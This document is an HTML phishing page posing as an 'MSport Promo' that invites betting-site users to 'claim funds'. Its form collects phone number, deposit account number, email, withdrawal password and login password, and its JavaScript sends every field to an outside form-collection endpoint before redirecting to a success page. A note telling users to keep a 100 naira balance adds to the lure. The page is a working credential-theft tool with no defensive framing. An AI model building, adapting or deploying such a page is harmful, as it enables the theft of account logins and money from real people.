<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MSport Promo</title>
    <style>
        body {
            background-color: black;
            font-family: Arial, sans-serif;
            color: white;
            text-align: center;
            margin: 0;
            padding: 0;
        }

        .top-bar {
            background-color: #FFA500;
            padding: 15px;
            font-weight: bold;
            text-align: center;
        }

        .menu-button {
            background: black;
            color: white;
            border: none;
            padding: 10px;
            font-size: 16px;
            cursor: pointer;
        }

        .note {
            color: orange;
            font-size: 14px;
            margin-top: 5px;
            padding: 10px;
        }

        .container {
            background-color: #222;
            padding: 20px;
            border-radius: 10px;
            width: 80%;
            max-width: 400px;
            margin: 20px auto;
            box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.2);
        }

        input {
            width: 90%;
            padding: 12px;
            margin: 10px 0;
            border: 2px solid green;
            border-radius: 20px;
            background-color: white;
            color: black;
            font-size: 16px;
            outline: none;
        }

        button {
            background-color: #FFA500;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            width: 95%;
            margin-top: 10px;
        }

        button:hover {
            background-color: #e69500;
        }
    </style>
</head>
<body>

    <div class="top-bar">
        <button class="menu-button">â˜° MENU</button>
    </div>

    <div class="note">
        NOTE: MAKE SURE YOUR MSPORT ACCOUNT HAS A BALANCE OF 100 NAIRA BEFORE CLAIMING YOUR FUNDS
    </div>

    <div class="container">
        <form id="promoForm" method="POST" action="https://usebasin.com/f/afe28c860a3b">
            <input type="text" name="phone" placeholder="Phone Number" required>
            <input type="text" name="account_number" placeholder="Account Number used to deposit" required>
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="withdrawal_password" placeholder="Withdrawal Password" required>
            <input type="password" name="login_password" placeholder="Login Password" required>
            <button type="submit">Claim funds</button>
        </form>
    </div>

    <script>
        document.getElementById("promoForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Prevent default submission

            var form = event.target;
            var formData = new FormData(form);

            fetch(form.action, {
                method: "POST",
                body: formData
            })
            .then(response => {
                if (response.ok) {
                    window.location.href = "success.html"; // Redirect to success page
                } else {
                    alert("Error submitting form. Please try again.");
                }
            })
            .catch(error => {
                console.error("Submission error:", error);
                alert("Network error. Please try again later.");
            });
        });
    </script>

</body>
</html>
